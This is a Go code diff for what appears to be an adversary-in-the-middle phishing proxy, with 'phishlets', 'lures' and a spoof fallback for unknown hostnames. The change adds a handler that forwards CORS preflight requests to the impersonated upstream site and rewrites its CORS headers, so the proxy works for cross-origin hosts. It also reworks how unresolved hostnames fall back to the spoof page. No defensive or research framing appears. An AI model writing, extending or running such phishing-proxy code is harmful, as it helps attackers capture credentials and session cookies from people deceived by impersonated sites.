@@ -105,6 +105,14 @@ func (c *connection) serve(ctx context.Context) {
 			continue
 		}
 
+		// CORS preflight — forward to upstream without session setup.
+		// The CORS spec forbids cookies on OPTIONS, so initSession
+		// would always fail for cross-origin proxy hosts.
+		if req.Method == http.MethodOptions {
+			c.handlePreflight(req)
+			continue
+		}
+
 		c.handleRequest(req)
 	}
 }
@@ -240,12 +248,11 @@ func (c *connection) initSession(firstReq *http.Request) (initResult, error) {
 	// 4. Resolve phishlet + lure from hostname.
 	hostname := hostWithoutPort(strings.ToLower(firstReq.Host))
 	phishlet, lure, err := c.server.PhishletSvc.ResolveHostname(hostname, firstReq.URL.Path)
+	if errors.Is(err, aitm.ErrNotFound) {
+		return initSpoof, nil
+	}
 	if err != nil {
 		return initFailed, fmt.Errorf("resolving hostname %q: %w", hostname, err)
-	}
-
-	if phishlet == nil {
-		return initSpoof, nil
 	}
 
 	c.phishlet = phishlet
@@ -452,6 +459,33 @@ func (c *connection) forwardRequest(req *http.Request) (*http.Response, error) {
 	resp.Request = req
 
 	return resp, nil
+}
+
+// handlePreflight forwards the OPTIONS request directly to upstream.
+func (c *connection) handlePreflight(r *http.Request) {
+	if c.phishlet == nil {
+		hostname := hostWithoutPort(strings.ToLower(r.Host))
+		phishlet, _, err := c.server.PhishletSvc.ResolveHostname(hostname, r.URL.Path)
+		if err != nil {
+			c.server.Logger.Debug("preflight for unresolved hostname", "hostname", hostname)
+			return
+		}
+		c.phishlet = phishlet
+	}
+
+	c.rewriteURL(r)
+
+	resp, err := c.forwardRequest(r)
+	if err != nil {
+		c.server.Logger.Error("preflight upstream request failed", "error", err, "url", r.URL.String())
+		return
+	}
+	defer resp.Body.Close()
+
+	c.rewriteCORSHeaders(resp)
+	if err := resp.Write(c.rawConn); err != nil {
+		c.server.Logger.Debug("writing preflight response", "error", err)
+	}
 }
 
 // sessionID returns the session ID from the connection state if available
